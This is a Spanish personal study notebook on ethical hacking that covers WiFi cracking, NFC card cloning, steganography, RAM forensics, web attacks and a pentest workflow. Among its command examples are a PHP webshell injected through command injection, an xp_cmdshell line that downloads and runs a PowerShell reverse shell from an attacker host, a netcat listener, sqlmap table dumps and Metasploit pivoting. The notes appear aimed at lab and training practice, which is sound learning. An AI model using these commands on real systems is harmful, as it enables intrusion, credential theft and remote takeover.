# Mis Notas de Ciberseguridad
Estas son las notas que he ido cogiendo desde que empecé a aprender sobre hacking ético y ciberseguridad. Quería mover todo del bloq de notas donde las tenía a algo "bonito" porque el archivo a crecido demasiado y también me parecía que podría ser interesante para alguien más.

# Índice

<!-- TOC depthFrom:1 depthTo:6 withLinks:1 updateOnSave:1 orderedList:1 -->

1. [Cosas útiles](#cosas-útiles)
2. [Identificación de frecuencias de radio (Tarjetas NFC)](#identificación-de-frecuencias-de-radio-tarjetas-nfc)
	1. [Dispositivos](#dispositivos)
3. [Redes WIFI](#redes-wifi)
	1. [Algunos conceptos](#algunos-conceptos)
	2. [Ataques](#ataques)
	3. [Herramientas](#herramientas)
4. [SDR (Radio Hacking)](#sdr-radio-hacking)
	1. [Conceptos](#conceptos)
	2. [Fases](#fases)
	3. [Herramientas](#herramientas-1)
5. [Criptología](#criptología)
	1. [Criptografía](#criptografía)
		1. [Tipos](#tipos)
		2. [Herramientas](#herramientas-2)
		3. [Diccionarios](#diccionarios)
	2. [Steganografía](#steganografía)
		1. [Steganografía técnica](#steganografía-técnica)
			1. [Algunos conceptos](#algunos-conceptos-1)
			2. [Técnicas](#técnicas)
			3. [Herramientas varias de steganografía (Cada uno usará su algoritmo)](#herramientas-varias-de-steganografía-cada-uno-usará-su-algoritmo)
			4. [Stegoanálisis](#stegoanálisis)
				1. [Herramientas varias de stegoanalisis](#herramientas-varias-de-stegoanalisis)
				2. [Lecturas recomendadas](#lecturas-recomendadas)
6. [Forense](#forense)
	1. [Capturas de ram](#capturas-de-ram)
		1. [Volatility](#volatility)
			1. [lsass.exe](#lsassexe)
	2. [Imagen de disco](#imagen-de-disco)
		1. [FTK Imager](#ftk-imager)
7. [Hacking web](#hacking-web)
	1. [Herramientas](#herramientas-3)
	2. [Ataques](#ataques-1)
8. [Metodología de hacking (Pentest)](#metodología-de-hacking-pentest)
	1. [Ciclo de vida de un pentest](#ciclo-de-vida-de-un-pentest)
		1. [Reconocimiento (OSINT o inteligencia de fuentes abiertas)](#reconocimiento-osint-o-inteligencia-de-fuentes-abiertas)
		2. [Escaneo y enumeración](#escaneo-y-enumeración)
		3. [Ganar acceso y escalar privilegios](#ganar-acceso-y-escalar-privilegios)
		4. [Mantener acceso, Cubrir rastro y Reportar](#mantener-acceso-cubrir-rastro-y-reportar)
		
<!-- /TOC -->

# Cosas útiles

- **`[COMAND] 2> /dev/null`:** Para quitar la salida de error y pasar de ella)
- En `/dev/shm` podemos escribir seamos quien seamos, es la carpeta de memora compartida del sistema
- Ruta de ejemplo de donde se encuentra el archivo archive.php en Wordpress: `http://10.10.248.106/wp-content/themes/twentyfifteen/archive.php`
- **Algunas VPN y proxies:** freedom vpn, opera vpn, proxy ultrasurf
- Se puede utilizar un *spoofer* para cambiar la info del disp
- Cuidado con las balizas en los acortadores de ip (redirecciones que hacen que puedan pillarte información). Existen herramientas para desacortar un enlace
- **Logstalgia:** Programita para pasarle un log de conexiones y generar de forma visual las peticiones que hay al sistema
- **Metasploiteable:** Máquina virtual para practicar
- **Pirámide de la seguridad informática (CIA):** Confidencialidad, Integridad, Disponibilidad y no repudio
-**smbclient:**
	- **`smbclient -N -L //IP/`:** Para listar directorios de un server samba windows.
	- **`smbclient -N //IP/dir`:** Nos conectamos y entramos al directorio que hayamos puesto
	- Con el comando `get` podemos pillar archivos
- **Impacket:** Colección de clases de Python para trabajar con protocolos de red. Conectarte a cualquier lado pero gestionando a mano el protocolo, la cosa es que incluye ejemplos tipo:
	- **mssqlclient:** Un cliente para conectarte a una base de datos SQL
	- **psexec:** Abrir shell remoto con privilegios
- **nc:** Super útil, permite conectarse a todo tipo de servicios, mandar comandos, escuchar en un determinado puerto...

# Identificación de frecuencias de radio (Tarjetas NFC)
Trabajan a 125 khz o 13.56 Mhz. Se pueden leer la info de una tarjeta de pago, existe una app de android con la que podemos hacerlo facilmente: https://github.com/devnied/EMV-NFC-Paycard-Enrollment

## Dispositivos
- **Proxmark3:** Sirve para leer y copiar tarjetas
	- Dos antenas, para 125 khz y 13.56 Mhz
	- Modo standalone o modo conectado
	- Existen dos firmwares: Oficial y Iceman (Para hacer ataques de fuerza bruta a tarjetas sin clave por defecto)
	- Lo que te bajas tiene varios BAT para hacer las cosas, para flashear el firmware pues miramos que puerto com tenemos la proxmark y lo cambiamos en el fichero BAT (Todos asi)

# Redes WIFI
## Algunos conceptos
**Beacon Frames**: El movil va preguntando si esta disp alguna de las redes a las que se ha conectado a vces. Si alguien esta snifeando, podria hacer un "gemelo" de la red y que el movil se conecte F.
**Modo promiscuo/ Modo monito**: Nuestra tarjeta de red o WIFI debe permitirlo para poder snifear la red

## Ataques
- **Jamming:** Atacar la señal (inhibidor) Hay jammers reactivos, randoms, constantes.
- **Deauth de usuarios:** No es un jammer
- **Redes Públicas:** Cuidado porque no sabes quien hay detrás 
- **Portal cautivo:**
	- Lo tipico de los hoteles. Lo facil seria spofeando la mac por la de alguien conectado
	- Iodine (tunel DNS) o dns2tcp podemos saltar el portal
- **WEB (ChopChop):**
	- Detectamos primer bloque de un paquete ARP.
	- Tomamos el ultimo byte cifrado y se prueban combinaciones para determinar como se calcula el ICV (Vector inicialización o check de integridad)
	- La idea es tomar muchos ICVs para poder ir descartando y sacar la clave
	- Al final se descifra el byte. Así con todos
- **WPS (Pixie Dust):**
	- Al ser un pin de 8 digitos se descifra por fuerza bruta y yap.
- **WPA:** 
	- No se que del 4  wayhandshake que se captura el tercer paquete (instalación). Este paquete se puede reenviar lo que nos dé la gana y por tanto descifrar el paquete
	- Bettercap 2 + hcxtools: bettercap --iface nombreInterfaz a utilizar para snif
		- Ataque:
		1. wifi.recon on
		2. Nos limitamos a mirar solo un canal para reducir el ruido (wifi.recon.channel 6)
		3. Con bettercap podemos hacer ataques de deautentificación a un AP (wifi.deauth macRouter). Lo hacemos para forzar a disp a reconectar
		4. Se captura el WPA2 handshake (hcxdumptool puede sacar el psk aunque tambien podemos crackear el paquetito que hemos capturado)
		5. Con lo capturado pues crackeamos con hashcat para sacar el PSK (clave del router vaya) a partir del PMK
		6. Para no tener que esperar a un cliente para robar el handsake nos podemos asociar a un AP (No hace falta saber clave)
		7. wifi.assoc all (Sacamos el PKMID el cual es un hash que se genera hasheando una cadena fija + mac de cliente + AP usando de contraseña el PSK)
- **Suplantación:** Hacer pensar que te conectas a un sitio pero nope jeje. Herramienta: hostapd y dnsmask (esto para el tema dns y dhcp) / wifiphisher, evil engines 2
- **Phising (2FA):** Haciendo que meta el codigo del sms tambien en la web al robar credenciales
		
## Herramientas
- **bettercap:** Analizador de redes. Puedes hacer lo mas que con wireshark
- **wireshark:** Sniffer
- Esto para ondas comunes viene bien (Diccionario):
	- **hcxdumptool:** Lo que hace es monitorizar paquetes que vayan saliendo para ver si son vulnerables y saca el PSK
	- **hcxpcaptool:** Lo mismo que el otro pero sacando el PMKID
- **cap2hccapx:** Cambio de formato de captura a hashcat
- **hashcat:** Usa varios ataques de fuerza bruta (Comando para esto: hashcat -m2500 (Para PMK) (-m16800 para PKMID) -a3 -w3 file)

# SDR (Radio Hacking):
Radio en la cual alguna o varias de las funciones de la capa física son definidas mediante software: filtros, mezcladores, amplificadores...

## Conceptos
- **Onda corta:** HF

## Fases
- **Muestreo**
- **Cuantificación**
- **Codificación de la señal**

## Herramientas
- **Virtual cable:** Para pasar a un programa de SDR desde tarjeta sonido
- **CW Skimmer:** Decodificador y analizador de ondas
- [**rtl_433**](https://github.com/merbanan/rtl_433)
- [**minimodem**](https://github.com/kamalmostafa/minimodem)
- **pyModeS:** Para decodificar los mensajes ADS-B (Los de los aviones)

# Criptología

## Criptografía
Ámbito de la criptología que se ocupa de las técnicas de cifrado o codificado destinadas a alterar las representaciones lingüísticas de ciertos mensajes con el fin de hacerlos ininteligibles a receptores no autorizados

### Tipos
- **Clásica:**
	- **Sustitución:** Reemplazar elementos del texto por otros
	- **Trasposición:** Desplazar elementos del texto
	- **Mixtos:** Combinación de los anteriores
- **Moderna:** 
	- **Clave simétrica:**
		- **En Serie:** Registros de desplazamiento que se mueven y se realimentan a nivel de bit
		- **En Bloque:** El texto se agrupa en bloques, se cifran con una clave y se optiene el texto cifrado. Hay que elegir como combinar los bloques
	- **Clave asimétrica:**
		- **Clave Pública y Privada**

### Herramientas
- **CrackStation o Google:** Para "revertir" un determinado hash común
- **hashcat:** Usa varios ataques de fuerza bruta
- [**Hydra**](https://github.com/vanhauser-thc/thc-hydra)**:** Permite realizar diferentes tipos de fuerza bruta
- **filemyhash:** Programa para descifrar un hash (base de datos)
- **hashidentifier:** Programa para identificar tipo de hash
- **dcode.fr:** Página para codificar y decodificar diferentes tipos de algoritmos de cifrado
- **CyberChef:** Se puede ir metiendo una receta de decodificación (tanto cifrado como codificación)
- [**John the Ripper**](https://github.com/openwall/john)**:** Permite crackear un montón de tipos de contraseñas

### Diccionarios
Para crackear contraseñas necesitaremos diccionarios, aquí dejo algunas opciones:
- **Localización del algunos de Kali:** `/usr/share/di*`, `/usr/share/wordlist`
- [**Rockyou**](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)**:** Un diccionario bastante utilizado
- [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)

## Steganografía
Técnicas de ocultación de información. Utilizar videos, imagenes o lo que sea como portadores de info

### Steganografía técnica

#### Algunos conceptos
- **Archivos Políglotas:** Permitir meter junto a por ejemplo una imagen código extra que se ejecute al abrirla
- **Entropía:** Mide el nivel de desorden de la información de un fichero. Una entropia alta (se puede calcular con `ent`) podría indicar info codificada o cifrada, lo cual puede ser malware, stego... **Ojo!** en la steganografia puede llevar a confusión, la entropía puede no variar de forma llamativa y además algunos algoritmos de steganografía o incluso programas comunes comprimen el archivo haciendo que tengan incluso menos entropía.
- **Existen:** Comprobadores de integridad de ficheros, sistemas antivirus, software analisis forense, herramientas de estegoanalisis para comprobar los ficheros

#### Técnicas
- **EoF:** Añadir información al final de un fichero con estructura. Si metes un zip al final de una imagen puedes hacer unzip
a la imagen para sacar lo que haya comprimido en el zip
- **LSB (Least significant bit):** Es muy común en imágenes y vídeo. Básicamente, es coger el bit menos significativo de la codificación RGB de cada pixel y cambiarlo. Podemos meter información en una imagen así sin que realmente afecte demasiado a los colores. Un método para extraer la información sería a traves de python con la librería Pillow u OpenCV recorriendo pixel a pixel y sacando grupos de bytes con los bits menos significativos de cada pixel.

#### Herramientas varias de steganografía (Cada uno usará su algoritmo)
- **Editores de imagenes**
- **Steghide:** Muy utilizada, permite embeber archivos en otros cifrando la info si queremos. Usa LSB.
- **OpenStego:** Permite embeber archivos en otros como la anterior pero con interfaz. Tambien meter watermark (trabaja con .bmp)
- **StegoSuite**
- **Jsteg**
- **Stegano**
- **LSBSteg**
- **F5**
- **DeepSound**
Problemas de las herramientas de arriba? Son comunes! Es mejor usar algoritmos propios.

#### Stegoanálisis
Ciencia o arte que permite detectar información oculta:
1. Detectar información ocultada en el stegomedio sospechoso. Fuerza bruta sobre algoritmos comunes por ejemplo
stegcracker: Fuerza bruta sobre al algoritmo de Steghide
2. Estimación del tamaño de la información ocultada
3. Estracción y recuperación de la información enmascarada

##### Herramientas varias de stegoanalisis
- Comando `file` para ver cabecera fichero, `strings` para ver si hay texto legible
- **exiftool:** Ver tipo fichero metadatos blabla
- **ghex:** Editor hexadecimal
- **xxd:** Para leer info hexadecimal
- **BinWalk:** Con `-e` para sacar archivos ocultos de otro. Si solo lo lanzamos contra un fichero saca info del mismo, si hay algo oculta y tal.
- **StegoVeritas**
- **Zsteg**
- **StegDetect:** Busca exploits conocidos
- **Jsteg**
- **Foremost**
- **Ffmpeg**

- **Imagen de docker stego-toolkit** Incluye todas las herramientas de esta sección. Tiene además 2 scripts (*check_jpg.sh* y *check_png.sh*) que automatizan el lanzar varias herramientas de análisis de stego

##### Lecturas recomendadas
- **Criptored de la UPM**
- **Esteganografia y Estegoanálisis**
- **Esteganografia  y canales encubiertos** - Por Dr. Alfonso Muñoz
- **StegoSploit**

# Forense

## Capturas de ram

### Volatility 
Herramienta para analizar capturas de RAM. Algunos ejemplos de uso:
```console
Anthares101@kali:~$ volatility -f imagen imageinfo #Saca el SO de la captura de RAM
Anthares101@kali:~$ volatility -f imagen --profile=PERFIL pstree #Saca el arbol de procesos en RAM
Anthares101@kali:~$ volatility -f imagen --profile=PERFIL netscan #Escanea buscando artefactos de red
Anthares101@kali:~$ volatility -f IMAGEN --profile=PERFIL cmdscan #Saca del proceso cmd el historial de comandos usados
Anthares101@kali:~$ volatility -f imagen --profile=PERFIL memdump -p PID -D DIRECTORIO_DESTINO #Dumpea un determinado proceso
```
El proceso dumpeado podemos procesarlo con WINDBG o strings: `strings FICHERO > salida.txt` que saca las cadenas legibles. Por defecto usa 8bits UTF8, con -el se puede cambiar a UTF16 (16bits):
```console
Anthares101@kali:~$ strings -td -a FILE.dmp
Anthares101@kali:~$ strings -td -el -a FILE.dmp
```
#### lsass.exe
Proceso de seguridad de windows, realiza la autentificación. Si está en memoria este proceso se podría ejecutar lo siguiente para mirar el proceso y sacar los hash de las contraseñas de los usuarios:
```console
Anthares101@kali:~$ volatility -f imagen --profile=PERFIL hashdump
```
Windows hashea las contraseñas con un hash tipo NTLM. Funciona tomando una contraseña, la parte por la mitad y hashea las partes por separado.

Si no hay contraseña, Windows tiene un tipo de hash por defecto que indica que una cadena esta vacía. Las password de windows son como max de 16 caracteres y se parten de 8 en 8 (Por la mitad vaya) En el hash una pass de 8 caracteres aparecería como el segundo hash, como que se rellenan al revés.

Podemos usar por ejemplo [CrackStation](https://crackstation.net/) para intentar revertir hash de windows comunes.
	
## Imagen de disco

### FTK Imager 

Sirve para montar imagenes de disco en modo lectura: `File/Add evidencee`, `item/Add image file` y le damos a finish. 

Si se quiere sacar un historial de TOR (y no está en RAM) montamos el disco y buscamos la carpeta. TOR no guarda el historial aunque esté basado en Firefox y tenga los ficheros sqlite de bases de datos (`TOR/Data/Browser/`) **pero** si que almacena los iconos de las paginas por las que navegas y su URL asociada (Creo que es el archivo favicons.sqlite o algo asi). Con sqlite browser podemos abrir este tipo de fihero.

Si se quiere ver si se ha comunicado mediante email con alguien y se ha intentado borrar pruebas (no hay nada en RAM) volveremos a la imagen de disco. Si no se encuentra instalado, da un poco igual porque en Appdata se guardan los datos de todos ls programas que se han usado en Windows. Si utilizó thunderbird, en la carpeta `profiles/profile/Mail/LocalFolders/message.mbox`, podemos encontrar el correo electronico si el usuario no se ha preocupado de borrarla manualmente.

Para sacar una contraseña de un gestor de contraseñas (no está en ram), como por ejemplo Keypass, primero hay que buscar la base de datos de las contraseñas, que en este programa esta en `Documents/password.kdbx`. Podemos usar `keypass2jhon.py` para sacar los hashes de la base de datos de keypass. Ahora se limpia lo de `password` que aparece en el fichero generado y se pasa el hash por hashcat:
```console
Anthares101@kali:~$ hashcat -m 13400 -a 0 -w 1 fichero diccionario --force --show #13400 tipo de keypass
```

# Hacking web

## Herramientas

- Utilizar basicamente el debugguer y la consola de los navegadores para desofuscar codigo y ejecutar funciones. También se puede mirar la red para mirar las peticiones (lo que se manda y recibe) para sacar información.
- Se puede utilizar curl para modificar las cabeceras que se mandan a una web:
	- **`-X`:** Cambia tipo de petición
	- **`-v`:** Más información en la salida del comando
	- **`-H`:** Para editar cabeceras: "User-Agent: kali"
- **Proxy inverso:** Burpsuite (o OWASP ZAP), captura todas las peticiones del navegador y permite su edicion. El modulo repeater de este proxy permite ir mandando y recibiendo cabeceras como si fuesemos el navegador vaya (las que queramos)
- [**Nikto**](https://github.com/sullo/nikto)**:** Escaner de vulnerabilidades web
- **WebShells:** Implementación basada en web del concepto de shell
- **ReverseShells:** El objetivo realiza la conexión e inicia una `shell` mientras el atacante escucha para despues obtener acceso a dicha `shell`
- Para sacar todos los directorios de una web podemos usar [gobuster](https://github.com/OJ/gobuster) o OWASP DirBuster
- Si encuentras un `.git` en una web BÁJALO. [GitTools](https://github.com/internetwache/GitTools) tiene cositas interesantes para trabajar con repos (Como bajarlos de una web)

## Ataques

- **Cross-site scripting:** Inyección de código Javascript malicioso en una página
- **Inclusión de archivos remotos:** Se utiliza en la url el parámetro `page` para ver de que pagina se hace el include y que se cargue un archivo de otro sitio. Se puede ejecutar un `webshell` para controlar y ver todo lo que hay en el server
- **Ataques de inclusión de ficheros locales:** Incluir dentro de la pagina web un fichero local, sitios de plantillas o descargas expuestos. Por ejemplo, cuando se pasa por url el fichero que se quiere utilizar para algo. Si no se acota a lo que puede acceder el servidor web, se puede acceder a archivos del propio Linux o Windows donde esta alojada la pagina.
- **Sql injection:** Existe un tipo de sql injection que es a ciegas. Es decir, los errores de la base de datos o la info no sale por pantalla y es necesario usar logica binaria (true / false) y poner que si un usuario existe, esperar x segundos. `sqlmap` automatiza todo esto:
```console
Anthares101@kali:~$ sqlmap -u URL --headers "Cookie: ..."
# Con --dbs sqlmap saca todas las bases de datos del sistema
# -D BBDD --tables Selecciona base de datos BBDD y muestra todas las tablas
# -D BBDD -T users --dump (Dump de la tabla users)
# --dump-all Dumpea todas las tablas de todas las bases de datos
```
Otra forma de hacerlo, es copiar de un proxy inverso la peticion HTML del servidor a un fichero y darselo a `sqlmap`.
- **RCE (Ejecución de comandos remotos):** En principio, si se esta poniendo el codigo directamente: `shell_exec('ping 8.8.8.8');` siendo la ip lo que el usuario mete, si en vez de eso ponemos ;ls pues aunque `ping` de error ejecuta el comando `ls`. Una vez detectada la vulnerabilidad podriamos ejecutar una WebShell: `;echo'<?php echo shell_exec(s_GET["cmd"]); ?>' > shell1.php`. Si nos vamos a `shell1.php`, con el parámetro de la url `cmd` podremos ejecutar los comandos que nos dé la gana.
- **Metodologia OWASP para testear seguridad en la web:** OWASP broken web application (Para practicar a atacar paginas y esas cosas) 

# Metodología de hacking (Pentest)
Usaremos OSSTM (Metodologia abierta de Comprobación y Seguridad), básicamente las cosas que hay que testear en un sistema.

## Ciclo de vida de un pentest

### Reconocimiento (OSINT o inteligencia de fuentes abiertas)
- **Información pública:** Prueba a hacer `curl -I -L https://www.google.com/ -v`
- **Hunter:** Para encontrar emails en paginas web
- **Robtex:** Investigación de IPs
- **Whois:** Utilizando la página https://whois.domaintools.com/ o el comando `whois` de Linux
- Comando `host <dominio>`
- Leaks de memoria en dominios (https://pastebin.pl/). Con https://haveibeenpwned.com/ tambien podemos ver si vale la pena buscar
- **mailfy:** Metes un email y te dice si tiene alguna cuenta de redes sociales linkeada
- **h8mail:** Metes un mail y busca información de leaks
- [**Shodan**](https://www.shodan.io/)**:** Búsqueda de dispositivos mediante ip, dominios que usen en sus servicions...
- **geoiplocation:** Saca una localización aproximada de una IP
- **ardilla.ai:** Mirar operadora de un número movil y ver si en algún momento se ha cortado
- Si se accede al archivo `robots.txt` de una pagina tenemos info de lo que no se quiere indexar
- **Foca:** para sacar metadatos de documentos
- Existen hosting dedicados y compartidos (varios dominios con una IP)
- **dnsmap:** Para subdominios
- **wafwoof:** Sondear firewall
- [**Netcraft**](https://www.netcraft.com/)**:** Histórico de los diferentes servicios IP donde se ha alojado un dominio
- **whatweb:** Saca información de una web
- **TheHarvester:** Recolecta toda la información que se puede obtener de un dominio
- **Dato curioso:** A veces nos podemos encontrar con que un determinado dominio tiene una carpeta (la raíz por ejemplo) que en vez de esta bloqueada porquen no hay nada que mostrar ahí, hace un directory listing. Con eso se puede sacar cosas guays

### Escaneo y enumeración
- [**rustscan**](https://github.com/RustScan/RustScan)**:** Escanea los puertos muy rápido y después ejecuta nmap
- [**nmap**](https://github.com/nmap/nmap)**:**
	- Las flags que usa por defecto son: `-PE`, `-PS`, `-PA` y `-PP`
	- **`--disable-arp-ping`:** Para cuando hay un proxy arp que dice que todos los hosts están *up*
	- El scan de puertos usa `-sS` por defecto si se ejecuta nmap como administrador
	- **`-PU`:** O modo UDP. Lento, puertos de este tipo tipicos: 53(DNS), 162/162(SNMP), 67/68(DHCP). 
	- **`--host-timeout`:** Puede ayudar a acelerar el scan de este tipo para saltar hosts lentos
	- Si no se recibe respuesta el puerto estará o filtrado o abierto. Mirar la version del servicio de un puerto con `-sV` puede ayudar
	- **`-sN`, `-sF`, `-sX`:** Pueden pasar más desapercibidos aunque muchos IDS los pillan igual. 
		- No distinguen entre abierto y filtered
		- **`--scan-flags`:** Para mas tipos de escaneos
		- Algunos sistemas nos siguen el estándar (cisco, microsoft) y marcan todo como cerrado. Para la mayoria de UNIX va bien
	- **`-sA`:** Realmente solo vale para determinar si los paquetes ACK son filtrados por el firewall
	- **`-sW`:** En ciertas implementaciones se puede identificar si un puerto esta open o no con la *flag* ACK. No siempre y pocos sistemas asi. Comportamiento inverso a veces
	- **`-sM`:** Utiliza Fin/ACK. Algunos sistemas BSD devuelven RST si estan cerrados pero no si estan abiertos.
	- **`-sZ`:** Util para saltar ciertas reglas de firewall pero no es algo invisible tampoco
	- **`-sO`:** Determina los protocolos soportados por la maquina objetivo
	- **`-sI`:** El tipo zombie es para hacer el scan desde otro host. Esto permite saltar cosas como un filtro IP y culpar a otra maquina del escaneo. También es útil para determinar relaciones de confianza entre hosts
	- Con este script se puede determinar si un host es buen zombie `nmap --script ipidseq [--script-args probepor=port] target` (Con `-O -v` también podríamos saberlo). La máquina zombie deberá estar ociosa (IDLE) y utilizar un generador de secuencia IP (IP ID Sequence Generation) de tipo `Incremental` o `Broken little-endian incremental` para poder predecir que ID colocará a los paquetes.
		- Ejemplo: `nmap -Pn -sI zombie_ip target_ip` La flag `-Pn` es importante, puesto que si no la ponemos nmap hará en primer ping al objetivo para saber si está vivo y se pierde la gracia de ser sigiloso
	- **`-b`:** Útil si todo falla. Analizar objetivo desde host ftp
	- **Scipts**
		- **Categorias:** auth, broadcast, brute, default, discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, vuln
		- Hay un script que podemos usar con `--script=banner` que lo que hace es determinar versiones de servicios a partir del banner que te dan al conectar. Esto se puede hacer con telnet y netcat tambien.
	- **Timing**
		- Nmap tiene parámetros para determinar tiempos de respuesta, cada cuento mandar paquetes... pero al final se suele usar una plantilla: `-T paranoid | sneaky | polite | normal | aggressive |insane (Del 0 al 5)`
	- **Firewalls**
		- Con esta opción se pueden modificar los paquetes IP enviados para intentar saltarnos un firewall `--ip-options R (record-route) | T (record-timestamp) | U (R y T) |  L (Ruting loose) <ip> | S (Ruting strict) <lista ip>`
		- **`--spoof-mac`:** Le puedes pasar 0 para que sea random, un nombre tipo Apple | Cisco o la cadena en hexadecimal que sea (si no es completa la termina nmap)
		- **`--proxies`:** Está bastante verde según la documentacin, solo los scripts y el scan de versiones funcionan con esto. Basicamente especificas una serie de proxys por los que pasar antes de conectar al target. Prefiero usar [Proxychains](https://github.com/haad/proxychains) directamente la verdad.
		- **`--badsum`:** Se mandan paquetes corruptos que el sistema descarta al estar mal y por tanto las respuestas suelen venir de IDS o Firewalls que no miran los checksums
		- **`--adler32`:** Para utilizar el antiguo algoritmo de cálculo del checksum de un paquete SCTP. Puede venir bien para recibir paquetes de sistemas antiguos
- **nessus:** Hace un escaneo de vulnerabilidades de un host. Tiene interfaz bonita. No permite escanear de forma remota, solo local en version gratuita, aunque se podría hacer un tunel ssh para nessus. Esta guay para ver las vulnerabilidades directamente con sus puntuaciones y tal.
- **MBSA:** Algo obsoleto pero se puede bajar para escanear nuestro PC Windows en busca de brechas de seguridad
- [**gobuster**](https://github.com/OJ/gobuster)**:** Para sacar todos los directorios de una web
- [**Nikto**](https://github.com/sullo/nikto)**:** Escaner de vulnerabilidades web: Escaner de vulnerabilidades web
- **enum4linux:** Para pillar info de hosts Windows y Samba
- **CVSS:** Se utiliza un sistema de puntuación para dar puntos a las diferentes vulnerabilidades que se encuentren y dar un nivel de riesgo
- **Etiquetado de vulnerabilidades**
	- Para buscar las puntuaciones hay que buscar por etiqueta, hay varias:
		- CVE para buscar las vulnerabilidades
		- También está BID (Bugtrac id) de security focus para identificar vulnerabilidades
		- El propio de Windows
		- **Bases de datos:**
			- OSVD, NVD, BID, ExploitDB

### Ganar acceso y escalar privilegios
- Como estabilizar un revershell:
```console
# https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
# In the reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z

# In our machine
$ stty raw -echo
$ fg

# In reverse shell
# Push Intro/CTRL-C
$ export TERM=xterm
```

- [**metasploit**](https://github.com/rapid7/metasploit-framework)**:**
	- Metasploit tiene un montón de exploits ademas de un entorno de desarrollo para crear nuevos. Para iniciarlo por primera vez: 
	```console
	Anthares101@kali:~$ sudo msfdb init #Inicializa base de datos
	Anthares101@kali:~$ msf console #Iniciar metasploit
	```
	- **Así cosas basicas:**
		- **`use [ruta exploit]`:** Así se selecciona que se utilizará
		- **`show options`:** Mostrará los parámetros del exploit a configurar
		- Podemos hacer `set [PARAM] [VALUE]` para configurar un determinado parámetro: `set LHOST 10.0.2.4`
		- **`set PAYLOAD cmd/unix/reverse`:** Esto lo que hace es añadir al exploit un payload, que en este caso ejecutará un shell remoto
		- **`run`:** Ejecutar un exploit o lo que sea que tengamos seleccionado con `use`
		- **`meterpreter`:** Es algo así como una shell vitaminada. Con el comando shell tendremos acceso a una shell del sistema
		- **Shellcode:** Conjunto de instrucciones dentro de un payload que suele estar en ensamblador
		- **Encoder:** Esconde los payloads
	- Para upgradear shell a meterpreter: `post/multi/manage/shell_to_meterpreter` y una vez en meterpreter podemos usar módulos de post útiles:	
		- **`run post/windows/gather/checkvm`
		- **`run post/multi/recon/local_exploit_suggester`:** Para ver que podemos usar para subir privilegios
		- **`run post/windows/manage/enable_rdp`:** Para abrir el control de escritorio remoto
		- **`run autoroute -h`:** Permite usar como gateway la máquina victima para acceder a otras partes de la red
	- En caso de querer utilizar alguna herramienta externa a metasploit podemos hacer lo siguiente:
		1. Abrir un proxy socks4a desde metasploit para utilizar la route que hemos metido antes
		2. Una vez con eso hecho, vamos al fichero `/etc/proxychains.conf` y añadimos una linea de que proxy usar (Ejemplo: `socks4 127.0.0.1 8080`)
		3. Con el comando `proxychains` delante de cualquier comando podremos mandar dicho comando a traves de nuestro proxy
- [**Hydra**](https://github.com/vanhauser-thc/thc-hydra)**:** Buscar contraseñas por fuerza bruta a tavés de un protocolo o web
- [**linpeas/winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)**:** Saca info de la máquina para ver como escalar
- [**John the Ripper**](https://github.com/openwall/john)**:** Permite crackear un montón de tipos de contraseñas.
- **ReverShell desde server SQL:**
	- Con este comando: `xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.3/shell.ps1\");"` se puede ejecutar
la shell reversa que tenemos en el equipo desde server SQL vulnerable. 
	- Recordad hacer en local: 
		- **`python3 -m http.server 80`:** En el directorio donde se tenga el archivo de `reverseShell`
		- **`nc -lvnp 443`:** Para escuchar la conexión de la maquina objetivo que nos proporcionará un shell remoto
		- **`ufw allow from 10.10.10.27 proto tcp to any port 80,443`:** Para abrir los puertos pertinentes en caso de tener `Uncomplicated Firewall` 
### Mantener acceso, Cubrir rastro y Reportar
